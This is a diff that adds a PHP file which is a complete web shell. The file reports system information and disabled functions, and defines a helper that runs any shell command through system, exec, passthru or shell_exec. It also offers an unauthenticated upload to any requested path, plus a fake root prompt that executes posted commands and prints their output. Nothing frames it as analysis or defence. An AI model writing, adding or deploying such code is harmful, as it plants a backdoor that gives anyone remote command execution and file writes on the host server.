@@ -1,0 +1,52 @@
+<html>
+<?php 
+$kernel = php_uname();
+$ds = @ini_get("disable_functions");
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
+echo "System: ".$kernel."<br>
+Disable Functions: <br>$show_ds<br>";
+echo "<br>";
+
+function exe($cmd) {
+	if(function_exists('system')) { 		
+		@ob_start(); 		
+		@system($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('exec')) { 		
+		@exec($cmd,$results); 		
+		$buff = ""; 		
+		foreach($results as $result) { 			
+			$buff .= $result; 		
+		} return $buff; 	
+	} elseif(function_exists('passthru')) { 		
+		@ob_start(); 		
+		@passthru($cmd); 		
+		$buff = @ob_get_contents(); 		
+		@ob_end_clean(); 		
+		return $buff; 	
+	} elseif(function_exists('shell_exec')) { 		
+		$buff = @shell_exec($cmd); 		
+		return $buff; 	
+	} 
+}
+
+$files = @$_FILES["files"];
+if ($files["name"] != '') {
+    $fullpath = $_REQUEST["path"] . $files["name"];
+    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
+        echo "<h3><a href='$fullpath'>Upload Success!</a></h3>";
+    }
+}
+echo '<html><body><form method=POST enctype="multipart/form-data" action=""><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
+
+echo "<br><form method='post'>
+<font>&nbsp;&nbsp;root@localhost: ~ $ </font>
+<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
+</form>";
+if($_POST['do_cmd']) {
+	echo "<pre>".exe($_POST['cmd'])."</pre>";
+}
+?>
+</html>
